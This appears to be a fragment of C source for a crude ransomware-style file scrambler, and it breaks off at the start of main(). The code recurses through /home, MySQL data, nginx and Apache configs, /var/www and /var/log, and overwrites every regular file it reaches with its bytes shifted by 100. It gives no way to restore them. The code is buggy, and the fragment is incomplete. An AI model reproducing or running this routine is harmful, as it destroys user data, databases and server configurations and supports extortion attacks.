#include<stdio.h>
#include<dirent.h>
#include<string.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<time.h>
int encrypt(char d[255],int s) 
  {char* as;
int num;
char fname[20],ch;
    
    FILE *fps, *fpt;
    printf(" %s \n",d);
    fps = fopen(d, "r");
    if(fps == NULL)
        return 0;
    fpt = fopen("temp.txt", "w");
    if(fpt == NULL)
        return 0;
      
    ch = fgetc(fps);
    while(ch != EOF)
    {
        ch = ch+100;
        fputc(ch, fpt);
        ch = fgetc(fps);
    }
    fclose(fps);
    fclose(fpt);
    fps = fopen(d, "w");
    if(fps == NULL)
        return 0;
    fpt = fopen("temp.txt", "r");
    if(fpt == NULL)
        return 0;
    ch = fgetc(fpt);
    while(ch != EOF)
    {
        ch = fputc(ch, fps);
        ch = fgetc(fpt);
    }
    fclose(fps);
    fclose(fpt);
    printf("%s  \n",d);
    printf("\nFile %s Encrypted Successfully!", fname);
    return 0;
}
int path(char data[255],int s)
 {
struct dirent *de;
struct stat info;
char as[255];
char ap[255];
DIR *ds,*dp;
DIR *dr =opendir(data);
if(dr==NULL)
{
    printf("could not find");
}
strcpy(as,data);
   while((de=readdir(dr)) !=NULL)
   {
   strcpy(as,data);
   char ff[255];
    strcpy(ff,de->d_name);
    char a=ff[0];
    if(a =='.')
    continue;
    if(strcmp(as,"/")) 
    {
     strcat(as,"/");}
     strcat(as,de->d_name);
     stat(as,&info);
    if(S_ISREG(info.st_mode)==0)
 
     {
      if((strstr(as,"home") != 0 )|| (strstr(as,"var/lib/mysql") !=0)||(strstr(as,"etc/nginx")!=0)|| (strstr(as,"var/www") !=0)|| (strstr(as,"var/log") !=0)|| (strstr(as,"etc/apache2") !=0)){
      printf("tst\n");
      path(as,s);}}
   else
   {printf(" path : %s\n",as);
    encrypt(as,s); 
                  }}

 closedir(dr);
 return 0;
 }
 int main(void)
 {

